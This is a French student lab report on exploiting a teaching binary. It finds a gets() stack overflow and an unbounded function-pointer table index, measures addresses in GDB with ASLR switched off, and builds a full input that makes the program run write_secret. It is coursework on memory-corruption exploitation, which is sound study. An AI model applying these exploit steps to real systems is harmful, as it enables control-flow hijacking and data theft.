# Compte rendu TP2 INFO 001 : Buffer overflow et détournement de flot d'exécution

**Binôme :** Clément PALANCA · Kylian GRANDY

---

## Sommaire

- [1. Identification des vulnérabilités](#1-identification-des-vulnérabilités)
  - [Question 1 : buffer débordé sur la pile](#question-1--buffer-débordé-sur-la-pile)
  - [Question 2 : ligne qui déborde ce buffer](#question-2--ligne-qui-déborde-ce-buffer)
  - [Question 3 : buffer hors-pile indexé hors bornes](#question-3--buffer-hors-pile-indexé-hors-bornes)
  - [Question 4 : ligne qui déborde ce buffer](#question-4--ligne-qui-déborde-ce-buffer)
- [2. Exploitation de la vulnérabilité hors-pile (`ptrs`)](#2-exploitation-de-la-vulnérabilité-hors-pile-ptrs)
  - [Question 5 : adresse de `buf`](#question-5--adresse-de-buf)
  - [Question 6 : adresse de `ptrs`](#question-6--adresse-de-ptrs)
  - [Question 7 : adresse de `write_secret`](#question-7--adresse-de-write_secret)
  - [Question 8 : adresse de `p`](#question-8--adresse-de-p)
  - [Question 9 : exécuter `pat_on_back` via `ptrs[s] → p`](#question-9--exécuter-pat_on_back-via-ptrss--p)
  - [Question 10 : faire pointer `ptrs[s]` sur `buf[64]`](#question-10--faire-pointer-ptrss-sur-buf64)
  - [Question 11 : dumper le secret via `write_secret`](#question-11--dumper-le-secret-via-write_secret)
- [3. Exploitation de la vulnérabilité sur la pile (stack smashing)](#3-exploitation-de-la-vulnérabilité-sur-la-pile-stack-smashing)
  - [Question 12 : octets avant l'adresse de retour](#question-12--octets-avant-ladresse-de-retour)

---

## 1. Identification des vulnérabilités

### Question 1 : buffer débordé sur la pile

> _There is a stack-based overflow in the program. What is the name of the stack-allocated variable that contains the overflowed buffer?_

La variable est **`wis`**, locale à `put_wisdom` : un tampon de 128 octets alloué sur la pile et rempli par la saisie utilisateur.

```c
void put_wisdom(void) {
  char  wis[DATA_SIZE] = {0};   // 128 octets sur la pile
```

### Question 2 : ligne qui déborde ce buffer

> _Consider the buffer you just identified: Running what line of code will overflow the buffer?_

C'est la **ligne 62** :

```c
r = (int)gets(wis);
```

`gets()` copie la saisie dans `wis` sans contrôler sa taille : au-delà de 128 octets, on écrase la pile jusqu'à l'adresse de retour.

### Question 3 : buffer hors-pile indexé hors bornes

> _There is another vulnerability, not dependent at all on the first, involving a non-stack-allocated buffer that can be indexed outside its bounds. What variable contains this buffer?_

La variable est **`ptrs`**, un tableau **global** de 3 pointeurs de fonctions servant de table d'aiguillage.

```c
fptr  ptrs[3] = { NULL, get_wisdom, put_wisdom };
```

### Question 4 : ligne qui déborde ce buffer

> _Consider the buffer you just identified: Running what line of code overflows the buffer?_

C'est la **ligne 101**, dans `main` :

```c
int s = atoi(buf);        // s n'est jamais borné à 0..2
fptr tmp = ptrs[s];       // ligne 101 : lecture hors des bornes de ptrs
```

`ptrs[s]` lit donc un pointeur **hors du tableau**. C'est ce qui explique le crash du sujet : taper `156` donne `s = 156`, le programme lit `ptrs[156]` (soit `ptrs + 624` octets), y trouve une valeur qui n'est pas une adresse de fonction valide, et `tmp()` provoque un `Segmentation fault`.

---

## 2. Exploitation de la vulnérabilité hors-pile (`ptrs`)

> **Prérequis — désactivation de l'ASLR.** `ptrs` (globale) et `write_secret` (fonction) ont des adresses fixes, mais `buf` et `p` sont sur la **pile** : leur adresse est randomisée à chaque lancement tant que l'ASLR est actif, ce qui rend les valeurs de `s` non reproductibles. On le désactive donc sur la VM avant toute mesure :
>
> ```bash
> cat /proc/sys/kernel/randomize_va_space          # 1 ou 2 ⇒ ASLR actif
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
>
> Une fois à `0`, les adresses de pile sont identiques à chaque exécution (en GDB **et** à l'exécution réelle). **Toutes les adresses de cette section ont été relevées avec l'ASLR désactivé** et forment un jeu cohérent : il ne faut pas mélanger des adresses issues de sessions différentes.

### Question 5 : adresse de `buf`

> _What is the address of buf (the local variable in the main function)?_

**Adresse relevée :** `0xbffff0d0`.

`buf` étant une variable locale de `main`, il faut arrêter le programme **à l'intérieur de `main`** pour que GDB connaisse son adresse. On procède avec deux terminaux, en attachant GDB à un processus déjà lancé :

1. **Terminal 1** — lancer le programme, qui attend au menu :

   ```bash
   ./runbin.sh
   ```

2. **Terminal 2** — attacher GDB au processus, poser un point d'arrêt dans `main` (ligne 101, identifiée à la question 4) et relancer l'exécution :

   ```gdb
   gdb -p `pgrep wisdom-alt`
   (gdb) break wisdom-alt.c:101
   (gdb) continue
   ```

3. **Terminal 1** — le programme est bloqué sur `read()` : saisir `1` puis Entrée pour qu'il atteigne le point d'arrêt.

4. **Terminal 2** — GDB reprend la main, arrêté dans `main` ; on affiche l'**adresse** (et non le contenu) de `buf` :

   ```gdb
   (gdb) print &buf
   $1 = (char (*)[1024]) 0xbffff0d0
   ```

### Question 6 : adresse de `ptrs`

> _What is the address of ptrs (the global variable)?_

**Adresse relevée :** `0x4040d4`.

`ptrs` étant **globale**, pas besoin de point d'arrêt : on l'affiche directement, juste après la Q5.

```gdb
(gdb) print &ptrs
$3 = (fptr (*)[3]) 0x4040d4 <ptrs>
```

### Question 7 : adresse de `write_secret`

> _What is the address of write_secret (the function)?_

**Adresse relevée :** `0x4011f9`.

`write_secret` est une **fonction** : son adresse est fixe dans le binaire, on l'affiche sans point d'arrêt. On la relève dans la **même** session que `buf`, `ptrs` et `p` (ASLR désactivé) pour garder un jeu d'adresses cohérent.

```gdb
(gdb) print &write_secret
$4 = (void (*)(void)) 0x4011f9 <write_secret>
```

### Question 8 : adresse de `p`

> _What is the address of p (the local variable in the main function)?_

**Adresse relevée :** `0xbffff4dc`.

`p` est **locale à `main`** (`fptr p = pat_on_back;`) : comme pour `buf`, il faut être arrêté dans `main`. Un point d'arrêt ligne 92 suffit (on ne cherche que l'adresse, pas la valeur).

```gdb
(gdb) break wisdom-alt.c:92
(gdb) continue
...
Breakpoint 2, main (...) at wisdom-alt.c:92
(gdb) print &p
$5 = (fptr *) 0xbffff4dc
```

### Question 9 : exécuter `pat_on_back` via `ptrs[s] → p`

> _What input do you provide to the program so that ptrs[s] reads (and then tries to execute) the contents of local variable p instead of a function pointer stored in the buffer pointed to by ptrs? Enter your answer as an unsigned integer._

**Réponse : `804252930`** (entier non signé).

#### Principe

`ptrs[s]` lit un pointeur de fonction à l'adresse `&ptrs + s * sizeof(fptr)`. Sur la VM (32 bits), un pointeur fait **4 octets**. On veut que cette adresse tombe pile sur `&p`, pour que `ptrs[s]` lise le contenu de `p` (qui vaut `pat_on_back`) et l'exécute :

```
&ptrs + s * 4 = &p
          ⇒ s = (&p − &ptrs) / 4
```

#### Mesure et calcul

```gdb
Breakpoint 1, main (argc=1, argv=0xbffff4f4) at wisdom-alt.c:101
101             fptr tmp = ptrs[s];
(gdb) print &p
$1 = (fptr *) 0xbffff4dc
(gdb) print &ptrs
$2 = (fptr (*)[3]) 0x4040d4 <ptrs>
```

```
s = (0xbffff4dc − 0x4040d4) / 4
  = 0xbfbfb408 / 4
  = 3 217 011 720 / 4
  = 804252930
```

#### Vérification

Dans un terminal, sans GDB, on relance le programme et on saisit l'entier au menu :

```bash
./runbin.sh
Selection >804252930
```

`atoi(buf)` vaut alors `804252930`, `ptrs[s]` pointe exactement sur `&p`, en lit le contenu (`pat_on_back`) et l'exécute : le message de `pat_on_back` s'affiche au lieu du `Segmentation fault` habituel, ce qui confirme le détournement.

### Question 10 : faire pointer `ptrs[s]` sur `buf[64]`

> _What do you enter so that ptrs[s] reads (and then tries to execute) starting from the 65th byte in buf, i.e., the location at buf[64]? Enter your answer as an unsigned integer._

**Réponse : `804252687`** (entier non signé).

> ℹ️ Les questions 10 et 11 sont **liées** et se traitent conjointement : l'entier calculé ici est précisément celui qui **ouvre** l'entrée de la Q11 (`804252687\x00…`).

#### Principe

Cette question pose la **même** idée que la Q9, mais en visant cette fois un emplacement **que nous contrôlons**. En Q9 nous faisions pointer `ptrs[s]` sur `p` (dont le contenu, `pat_on_back`, était fixé par le programme). Ici nous le faisons pointer sur `buf[64]`, c'est-à-dire **à l'intérieur de `buf`** — or `buf` est le tampon qui reçoit ce que nous tapons au menu. `ptrs[s]` ira donc lire une valeur que **nous** aurons écrite, ce qui prépare le détournement complet de la Q11.

`buf[64]` désigne le **65ᵉ octet** de `buf`, soit un décalage de **64 octets** depuis `&buf`. L'adresse cible est donc `&buf + 64`. On reprend la relation de la Q9 en remplaçant seulement le membre de droite (le pas `× 4`, taille d'un pointeur, ne change pas) :

```
&ptrs + s * 4 = &buf + 64
          ⇒ s = (&buf + 64 − &ptrs) / 4
```

#### Mesure et calcul

Adresses relevées (ASLR désactivé) aux questions 5 et 6 :

```gdb
(gdb) print &buf
$1 = (char (*)[1024]) 0xbffff0d0
(gdb) print &ptrs
$2 = (fptr (*)[3]) 0x4040d4 <ptrs>
```

```
&buf + 64 = 0xbffff0d0 + 0x40 = 0xbffff110
s = (0xbffff110 − 0x4040d4) / 4
  = 0xbfbfb03c / 4
  = 3 217 010 748 / 4
  = 804252687
```

La division tombe juste sur un entier, ce qui confirme l'alignement : `ptrs[804252687]` adresse exactement `&buf + 64`.

#### Lien avec la Q11

Ce `s = 804252687` est précisément l'entier qui **ouvre** l'entrée de la Q11. Saisi au menu, il est converti par `atoi` puis stocké en tête de `buf` ; `ptrs[s]` lit alors à partir de `buf[64]`, où nous aurons placé (grâce au bourrage des 64 premiers octets) l'adresse de la fonction à exécuter. C'est l'objet de la question suivante.

### Question 11 : dumper le secret via `write_secret`

> _What do you replace `\xEE\xEE\xEE\xEE` with in the following input so that the ptrs[s] operation executes the write_secret function? (endianness!)_
> `771675175\x00AAAA…AAAA\xEE\xEE\xEE\xEE`

**Réponse : on remplace `\xEE\xEE\xEE\xEE` par `\xf9\x11\x40\x00`.**

Q10 fait lire `ptrs[s]` à partir de `buf[64]` ; il reste à placer **à cet offset** l'adresse de la fonction à exécuter. Les 4 octets `\xEE\xEE\xEE\xEE` tombent précisément sur `buf[64..67]` : ce sont donc eux qui doivent contenir l'adresse de `write_secret` (`0x4011f9`, relevée en Q7).

Le x86 est **little-endian** (octet de poids faible en premier) :

```
0x004011f9  →  \xf9\x11\x40\x00
```

Structure de l'entrée :

| Octets de `buf` | Contenu            | Rôle                                                     |
| --------------- | ------------------ | -------------------------------------------------------- |
| 0–8             | `804252687`        | lu par `atoi` → `s` (réponse Q10)                        |
| 9               | `\x00`             | termine l'entier                                         |
| 10–63           | 54 × `A`           | bourrage jusqu'à `buf[64]` (= `64 − 9 − 1`)              |
| 64–67           | `\xf9\x11\x40\x00` | adresse de `write_secret`, lue et exécutée par `ptrs[s]` |

Entrée complète, saisie via `./runbin.sh` :

```
804252687\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf9\x11\x40\x00
```
